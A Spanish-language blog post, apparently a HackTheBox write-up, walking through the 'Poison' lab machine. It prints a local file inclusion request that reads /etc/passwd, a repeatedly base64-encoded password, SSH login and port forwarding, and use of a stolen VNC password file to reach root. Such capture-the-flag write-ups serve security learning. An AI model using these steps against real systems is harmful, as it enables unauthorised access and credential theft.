@@ -1,0 +1,174 @@
+---
+layout: post
+title: "Poison"
+subtitle: 'HackTheBox - Medium Machine - Linux'
+date: 2020-03-29 12:00:00
+author: "TheusZero"
+header-img: "images/post/poison/1.png"
+catalog: true
+comments: true
+tags:
+  - Linux
+  - Machine
+  - Explotations
+  - Upgrade
+  - Shell
+  - Root
+  - User
+---
+
+# Poison
+
+Es una maquina divertida, tiene varios caminos que te puedes plantear, sin embargo creo que lo mas importante es que
+te puede enseñar muxo, en el sentido del privesec y del enum.
+
+> Buena maquina, divertida y completa. Mis respetos al creador :D
+
+## Enumeracion
+
+
+#### NMAP
+```vim
+# Nmap 7.70 scan initiated Sat Sep 15 14:45:00 2018 as: nmap -n -vvv -sS -Pn --min-rate 5000 -oA nmap/initial 10.10.10.84
+Nmap scan report for 10.10.10.84
+Host is up, received user-set (0.073s latency).
+Scanned at 2018-09-15 14:45:00 EDT for 0s
+Not shown: 798 filtered ports, 200 closed ports
+Reason: 798 no-responses and 200 resets
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Sep 15 14:45:00 2018 -- 1 IP address (1 host up) scanned in 0.58 seconds
+```
+
+Con esto notamos que, solo tenemos dos vias, explorar el HTTP y entrar por ssh o por alguna reverse shell.
+
+Desde aqui hay varios caminos, sin embargo explicare el que yo realice para lograr hacer la maquina.
+
+#### Web
+Ya revisando lo que es la web, podemos ver lo siguiente:
+
+![](/TheusZero/images/post/poison/2.png)
+
+revisando los ***.php** podemos ver que uno de ellos de nombre **listfiles.php** tiene como informacion lo siguiente
+
+> Array
+  (
+      [0] => .
+      [1] => ..
+      [2] => browse.php
+      [3] => index.php
+      [4] => info.php
+      [5] => ini.php
+      [6] => listfiles.php
+      [7] => phpinfo.php
+      [8] => pwdbackup.txt
+  )
+
+Aquel **pwdbackup.txt** parece mega sospechoso, en el encontramos que nos muestra los archivos de una forma sospechosa tambien.
+
+Lo primero que hice fue cambiar la url mandando la misma peticion del GET pero en la parte de **.php?file=** le mande lo sgte:
+> **http://10.10.10.84/browse.php?file=/etc/passwd**
+
+como lo crei, me leyo el archivo /etc/passwd y logre cachar que habia un user llamado:
+> **charix**
+
+ya con esta informacion me puse a investigar el **pwdbackup.txt** que habia dejado botado, obteniendo de el lo sgte:
+
+```vim
+This password is secure, it's encoded atleast 13 times.. what could go wrong really..
+
+Vm0wd2QyUXlVWGxWV0d4WFlURndVRlpzWkZOalJsWjBUVlpPV0ZKc2JETlhhMk0xVmpKS1IySkVU
+bGhoTVVwVVZtcEdZV015U2tWVQpiR2hvVFZWd1ZWWnRjRWRUTWxKSVZtdGtXQXBpUm5CUFdWZDBS
+bVZHV25SalJYUlVUVlUxU1ZadGRGZFZaM0JwVmxad1dWWnRNVFJqCk1EQjRXa1prWVZKR1NsVlVW
+M040VGtaa2NtRkdaR2hWV0VKVVdXeGFTMVZHWkZoTlZGSlRDazFFUWpSV01qVlRZVEZLYzJOSVRs
+WmkKV0doNlZHeGFZVk5IVWtsVWJXaFdWMFZLVlZkWGVHRlRNbEY0VjI1U2ExSXdXbUZEYkZwelYy
+eG9XR0V4Y0hKWFZscExVakZPZEZKcwpaR2dLWVRCWk1GWkhkR0ZaVms1R1RsWmtZVkl5YUZkV01G
+WkxWbFprV0dWSFJsUk5WbkJZVmpKMGExWnRSWHBWYmtKRVlYcEdlVmxyClVsTldNREZ4Vm10NFYw
+MXVUak5hVm1SSFVqRldjd3BqUjJ0TFZXMDFRMkl4WkhOYVJGSlhUV3hLUjFSc1dtdFpWa2w1WVVa
+T1YwMUcKV2t4V2JGcHJWMGRXU0dSSGJFNWlSWEEyVmpKMFlXRXhXblJTV0hCV1ltczFSVmxzVm5k
+WFJsbDVDbVJIT1ZkTlJFWjRWbTEwTkZkRwpXbk5qUlhoV1lXdGFVRmw2UmxkamQzQlhZa2RPVEZk
+WGRHOVJiVlp6VjI1U2FsSlhVbGRVVmxwelRrWlplVTVWT1ZwV2EydzFXVlZhCmExWXdNVWNLVjJ0
+NFYySkdjR2hhUlZWNFZsWkdkR1JGTldoTmJtTjNWbXBLTUdJeFVYaGlSbVJWWVRKb1YxbHJWVEZT
+Vm14elZteHcKVG1KR2NEQkRiVlpJVDFaa2FWWllRa3BYVmxadlpERlpkd3BOV0VaVFlrZG9hRlZz
+WkZOWFJsWnhVbXM1YW1RelFtaFZiVEZQVkVaawpXR1ZHV210TmJFWTBWakowVjFVeVNraFZiRnBW
+VmpOU00xcFhlRmRYUjFaSFdrWldhVkpZUW1GV2EyUXdDazVHU2tkalJGbExWRlZTCmMxSkdjRFpO
+Ukd4RVdub3dPVU5uUFQwSwo=
+```
+
+brigido, a simple vista parece un base64 asi que me dispuse a hacer la conversion las 13 veces que pedia.
+
+> **wget http://10.10.10.84/pwdbackup.txt**
+>> **tail -n +3 pwdbackup.txt |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d |base64 -d**
+>>> **Charix!2#4%6&8(0**
+
+## User
+No se me ocurrio otra cosa que hacer, que intentar acceder al ssh con las credenciales obtenidas.
+**charix:Charix!2#4%6&8(0**
+Con eso logramos entrar y obtener el user.txt
+
+## Root
+
+El root me parecio algo bacan, ya que es mucho mas complejo que el user.
+
+al entrar al home del user, podemos encontrar un archivo llamado **secret.zip** al descomprimirlo es un mensaje ecnriptado o un tipo de passwd que no conozco, asi que me dispuse a enumerar un poco la maquina.
+```vim
+charix@Poison:~ % netstat -anp tcp | grep -i listen
+tcp4       0      0 127.0.0.1.25           *.*                    LISTEN
+tcp4       0      0 *.80                   *.*                    LISTEN
+tcp6       0      0 *.80                   *.*                    LISTEN
+tcp4       0      0 *.22                   *.*                    LISTEN
+tcp6       0      0 *.22                   *.*                    LISTEN
+tcp4       0      0 127.0.0.1.5801         *.*                    LISTEN
+tcp4       0      0 127.0.0.1.5901         *.*                    LISTEN 
+```
+
+pense en investigar los puertos 5901 y 5801, pero el camino que recorri fue el del 5901 ya que cache que bajo la maquina corre el siguiente servicio:
+
+```vim
+charix@Poison:~ % ps auxww
+USER    PID  %CPU %MEM    VSZ   RSS TT  STAT STARTED     TIME COMMAND
+...
+root    545   0.0  0.9  23620  9032 v0- I    15:13    0:00.09 Xvnc :1 -desktop X -httpd /usr/local/share/tightvnc/classes -auth /root/.Xauthority -geometry 1280x800 -depth 24 -rfbwait 120000 -rfbauth /root/.vnc/passwd -rfbport
+...
+```
+
+entrando en mi maquina, hice un [PortForwarding](https://theuszer0.github.io/TheusZero/CheatSheets/#ssh) para abrir el puerto 5901 bajo mi maquina.
+
+#### VNC
+
+el servicio corresponde a un [VNC](https://www.realvnc.com/es/connect/) , que a primera vista parece un xterm y se define como un software de acceso remotO.
+
+asi que, vamos al port forwardinggggg...
+```vim
+ssh -L 5901:localhost:5901 -N -f -l charix 10.10.10.84
+```
+ya montado el proceso, usaremos la herramienta vncviewer.
+```vim
+vncviewer localhost:5901
+```
+de momento nos pide una password y creo que el **secret.zip** debe tenerla.
+
+#### descargar el .zip
+
+para descargar el .zip ocupe el siguiente comando, todo va incluido
+```vim
+sshpass -p 'Charix!2#4%6&8(0' scp -oStrictHostKeyChecking=no charix@10.10.10.84:secret.zip .
+```
+```vim
+root@kali:~# cat secret
+[|Ֆz!
+```
+```vim
+root@kali:~# xxd secret
+00000000: bda8 5b7c d596 7a21                      ..[|..z!
+```
+la clave esta codificada en algun algoritmo que de principio no debemos tocar, asi que me dispuse a ingresar al VCN con la password.
+
+#### Password VCN
+```vim
+vncviewer -passwd secret 127.0.0.1:1
+```
+listo, entramos como root y podemos leer todo UWU.
